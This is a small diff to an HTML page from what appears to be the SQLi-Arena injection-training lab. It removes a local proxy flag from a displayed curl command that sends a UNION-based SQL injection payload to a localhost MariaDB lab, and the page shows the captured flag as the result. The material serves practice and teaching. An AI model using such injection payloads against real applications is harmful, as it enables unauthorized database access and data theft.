@@ -101,7 +101,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab5" \<br> --data-urlencode "ref=XYZNOTEXIST' UNION SELECT vault_key, NULL, NULL FROM sequence_vault -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab5" \<br> --data-urlencode "ref=XYZNOTEXIST' UNION SELECT vault_key, NULL, NULL FROM sequence_vault -- -"<br><br>
         <span class="prompt">Result: </span><strong>FLAG{ma_s3qu3nc3_0bj_1nj}</strong>
     </div>
 </div>
